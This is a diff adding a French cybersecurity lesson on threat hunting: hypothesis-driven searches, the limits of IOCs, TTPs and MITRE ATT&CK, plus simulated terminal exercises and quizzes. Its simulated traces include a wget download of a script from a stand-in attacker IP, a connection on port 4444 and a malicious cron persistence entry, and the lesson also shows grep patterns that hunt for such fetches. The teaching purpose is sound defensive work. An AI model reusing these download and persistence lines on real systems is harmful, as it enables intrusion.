@@ -1,0 +1,119 @@
+---
+refCode: CL-LSN-138-V01
+slug: blueteam-threat-hunting
+title: "La chasse aux menaces"
+description: "Au lieu d'attendre une alerte, chercher activement un attaquant déjà présent : la démarche par hypothèses, les indicateurs de compromission et leurs limites, et pourquoi la chasse complète la détection automatique."
+category: CYBERSEC
+difficulty: ADVANCED
+estimatedMinutes: 40
+xpReward: 520
+prerequisites: ["CL-LSN-137-V01"]
+---
+
+Voici une idée qui dérange quand on la prend au sérieux : toutes les intrusions ne déclenchent pas d'alerte. Un attaquant patient, qui connaît tes outils, qui se sert d'utilitaires déjà installés sur la machine au lieu d'amener ses propres malwares, peut passer sous le radar pendant des semaines. Ton SIEM ne dira rien parce que rien de ce qu'il fait ne correspond à une règle que tu as écrite. Les chiffres des rapports annuels d'intrusion le confirment : le temps moyen entre l'entrée d'un attaquant et sa découverte se compte souvent en dizaines de jours, parfois davantage.
+
+La chasse aux menaces part de cette gêne. Elle suppose qu'un intrus est peut-être déjà là, silencieux, et elle va le chercher au lieu d'attendre qu'il fasse une erreur bruyante. C'est une posture mentale avant d'être une technique : tu ne demandes pas « ai-je reçu une alerte ? », tu demandes « et si quelqu'un était entré sans en déclencher une, où le verrais-je ? ».
+
+## attendre ou chercher
+
+La détection automatique fonctionne en réaction. Tu écris des règles, des signatures, des seuils. Quand un événement les fait correspondre, une alerte part. C'est efficace, c'est rapide, et ça tourne 24 heures sur 24 sans fatigue. Mais ça ne voit que ce que tu as pensé à décrire. Une technique nouvelle, un comportement légèrement décalé, un attaquant qui reste dans les clous de l'usage normal : rien ne s'allume.
+
+La chasse, elle, est proactive. Elle démarre sans alerte, sur l'initiative de l'analyste. Personne ne lui a demandé de regarder, il regarde parce qu'il se pose une question. Ce n'est pas un remplacement de la détection automatique, c'est son complément. L'automatique attrape le volume, le connu, le répétitif. La chasse va dans les angles morts que l'automatique ne couvre pas encore.
+
+<Callout type="info">
+Une bonne chasse ne reste pas un coup unique. Quand elle trouve quelque chose, on en tire une nouvelle règle de détection. Ce qui était chassé à la main devient automatique, et la chasse suivante part de plus loin.
+</Callout>
+
+## la démarche par hypothèses
+
+Chasser au hasard dans des téraoctets de logs ne mène nulle part. La chasse sérieuse se structure autour d'hypothèses. Une hypothèse, c'est une question concrète qu'on formule à l'avance, puis qu'on va trancher avec les données.
+
+La forme est toujours la même : « si un attaquant faisait X, quelle trace verrais-je ? ». On part d'une technique d'attaque plausible, on déduit la trace qu'elle laisserait, puis on va chercher cette trace. Trois temps : formuler, chercher, conclure.
+
+Prenons un exemple complet. Hypothèse : si un attaquant avait établi une persistance sur un poste Linux, il aurait peut-être ajouté une tâche planifiée ou modifié un fichier de démarrage utilisateur. Trace attendue : une entrée récente dans une crontab, ou une ligne ajoutée à un .bashrc qui rappelle un serveur externe. Recherche : on liste les crontabs de tous les utilisateurs et on compare aux dates de modification. Conclusion : soit on ne trouve rien d'anormal, et l'hypothèse est rejetée pour ce périmètre (résultat utile, on a réduit l'incertitude), soit on trouve une entrée qu'aucun admin ne reconnaît, et on bascule en investigation.
+
+Un point qui surprend les débutants : une hypothèse qui ne trouve rien n'est pas un échec. Elle a couvert une zone et confirmé qu'elle est probablement saine. Le but n'est pas de toujours trouver un intrus, c'est de réduire méthodiquement les endroits où il pourrait se cacher.
+
+<Diagram caption="Le cycle d'une hypothèse de chasse">
+  flowchart TD
+    h["Hypothese : si attaquant fait X"]
+    t["Trace attendue : Y dans les donnees"]
+    s["Recherche : requete sur les logs"]
+    r["Resultat"]
+    neg["Rien : zone reduite, on note"]
+    pos["Trace : investigation + nouvelle regle"]
+    h --> t
+    t --> s
+    s --> r
+    r --> neg
+    r --> pos
+</Diagram>
+
+## les IOC et leurs limites
+
+Un indicateur de compromission, ou IOC, est un fait observable lié à une attaque connue : une adresse IP utilisée par un serveur de commande, le hash d'un fichier malveillant, un nom de domaine de phishing, une chaîne de caractères dans un user-agent. Les IOC circulent en flux de threat intelligence, et chercher les IOC connus dans ton environnement est un point de départ légitime.
+
+```text
+IP        203.0.113.9         serveur C2 observe campagne XYZ
+domaine   updates-cdn.example malveillant, enregistre il y a 3 jours
+hash      9f3c...a1b2 (SHA256) loader connu, famille Redline
+user-agent  Mozilla/4.0 (compatible; X)  outil d'exfiltration
+chemin    /tmp/.update         drop fréquent de ce groupe
+```
+
+Le problème des IOC tient en un mot : ils décrivent du connu, et le connu se périme. L'attaquant change d'IP, recompile son binaire (et le hash change entièrement), enregistre un nouveau domaine. Un IOC a souvent une durée de vie courte. Chasser uniquement les IOC, c'est toujours courir derrière la dernière infrastructure de l'adversaire, jamais devant. Ils restent utiles, mais comme une couche, pas comme la stratégie entière.
+
+## monter vers les comportements
+
+C'est là qu'intervient la notion de TTP : tactiques, techniques et procédures. Un IOC dit « cette IP précise est mauvaise ». Un TTP dit « ce groupe a l'habitude de voler des identifiants depuis la mémoire, puis de se déplacer latéralement via des connexions distantes ». Le comportement est beaucoup plus stable que l'infrastructure. L'attaquant peut changer d'IP en une minute ; changer sa façon de travailler, ses outils, ses réflexes, lui coûte bien plus cher.
+
+Chasser le comportement attrape donc plus large et plus durablement. Au lieu de chercher une IP, tu cherches « toute connexion sortante vers un port inhabituel depuis un serveur qui n'a aucune raison d'initier du trafic ». Cette requête attrape l'IP d'aujourd'hui et celle de demain.
+
+Le référentiel MITRE ATT and CK sert de catalogue commun à ces comportements. Il classe les techniques par étape de l'attaque (accès initial, persistance, exfiltration, etc.) et donne à chacune un identifiant. Une hypothèse de chasse se rattache souvent à une technique du catalogue, ce qui aide à mesurer la couverture : quelles techniques as-tu déjà chassées, lesquelles restent dans l'ombre.
+
+## chasser en pratique
+
+Concrètement, à quoi ressemble une session ? On regarde les endroits où un intrus laisse des traces malgré lui. Les connexions sortantes inhabituelles, parce qu'un attaquant a presque toujours besoin de rappeler chez lui. Les fichiers récents dans les zones temporaires, parce que c'est là qu'on dépose un outil. Les commandes étranges dans l'historique des shells, parce qu'un téléchargement suivi d'une exécution laisse une ligne.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Chercher des traces sur un hote suspect" commands={{"grep -rE '(curl|wget).*http' /home/*/.bash_history": "/home/user/.bash_history:wget http://203.0.113.9/x.sh", "ss -tnp | grep ESTAB": "ESTAB 0 0 10.0.0.5:49832 203.0.113.9:4444", "find /tmp -type f -newermt '-1 hour'": "/tmp/.x9a\n/tmp/.update"}} />
+
+Regarde ce que ces trois commandes racontent ensemble. Un historique de shell montre un téléchargement par wget vers une IP brute. Une connexion établie vers cette même IP sur le port 4444, un port classique d'outils d'accès distant. Et dans /tmp, deux fichiers cachés créés dans la dernière heure. Pris séparément, chacun pourrait avoir une explication. Pris ensemble, le faisceau est dur à ignorer.
+
+<Callout type="warning">
+Une trace n'est pas une preuve. Un fichier récent dans /tmp peut venir d'un build légitime, une connexion sur un port haut peut être un service normal. La chasse ne conclut pas sur un seul signal : elle corrèle, elle vérifie auprès de l'équipe concernée, et elle ne déclenche une réponse qu'une fois le faisceau solide. Crier au loup sur chaque fichier caché use la confiance de tout le monde.
+</Callout>
+
+## ce que la chasse rapporte
+
+Le bénéfice évident, c'est de trouver l'intrus furtif, celui que l'automatique a laissé passer. Mais ce n'est pas le seul, ni même le plus fréquent. La plupart des chasses ne trouvent pas d'attaquant, et c'est normal.
+
+Le second bénéfice, plus régulier, c'est l'amélioration de la détection. Chaque chasse t'apprend quelque chose sur ton environnement : un comportement normal que tu ne connaissais pas, un angle mort dans tes logs, une technique pour laquelle tu n'avais aucune visibilité. Quand une chasse trouve un vrai signal, tu en fais une règle automatique pour que ça ne te repasse plus jamais sous le nez à la main. La chasse alimente la détection, qui libère du temps pour chasser plus loin.
+
+<Callout type="success">
+Une chasse qui ne trouve aucun attaquant mais qui révèle un trou dans tes logs ou produit une nouvelle règle de détection est une chasse réussie. Le résultat se mesure en couverture gagnée, pas seulement en intrus capturés.
+</Callout>
+
+## à toi de jouer
+
+Reprends le poste suspect et confirme ton hypothèse avant de conclure.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Confirmer un faisceau d'indices" commands={{"crontab -l -u user": "* * * * * /tmp/.update", "ss -tnp | grep ':4444'": "ESTAB 0 0 10.0.0.5:49832 203.0.113.9:4444", "stat -c '%y %n' /tmp/.update": "2026-06-13 09:41 /tmp/.update"}} />
+
+<QuizGroup>
+
+<Quiz id="q-1" question="Qu'est-ce qui distingue la chasse aux menaces de la detection automatique ?" options={["La chasse demarre sans alerte, sur une hypothese de l'analyste", "La chasse remplace entierement le SIEM", "La chasse ne regarde que les alertes deja levees", "La chasse ne sert qu'a generer des rapports"]} correct={0} />
+
+<Quiz id="q-2" question="Pourquoi les IOC ont-ils une utilite limitee dans le temps ?" options={["Ils sont illegaux a partager", "Ils decrivent du connu et l'attaquant change facilement d'IP, de hash ou de domaine", "Ils sont toujours faux", "Ils ne fonctionnent que sous Windows"]} correct={1} />
+
+<Quiz id="q-3" question="Pourquoi chasser les comportements (TTP) attrape-t-il plus large que chasser les IOC ?" options={["Parce que les TTP sont plus faciles a ecrire", "Parce qu'un comportement est plus stable que l'infrastructure, qui change vite", "Parce que les IOC n'existent pas en pratique", "Parce que les TTP sont fournis par le pare-feu"]} correct={1} />
+
+</QuizGroup>
+
+## à retenir
+
+- La chasse part du principe qu'un attaquant peut déjà être présent sans avoir déclenché d'alerte, et va le chercher activement.
+- Elle complète la détection automatique au lieu de la remplacer : l'automatique couvre le connu, la chasse explore les angles morts.
+- La démarche se structure par hypothèses : « si un attaquant faisait X, quelle trace verrais-je ? », puis recherche dans les données, puis conclusion. Une hypothèse sans trouvaille reste utile : elle réduit l'incertitude.
+- Les IOC (IP, hash, domaine) décrivent du connu et se périment vite ; les comportements (TTP, catalogue MITRE ATT and CK) sont plus stables et attrapent plus large.
+- En pratique on cherche connexions sortantes inhabituelles, fichiers récents en zone temporaire, commandes suspectes dans l'historique, puis on corrèle. Une trace n'est pas une preuve.
+- Chaque chasse améliore la détection : un vrai signal trouvé à la main devient une règle automatique.
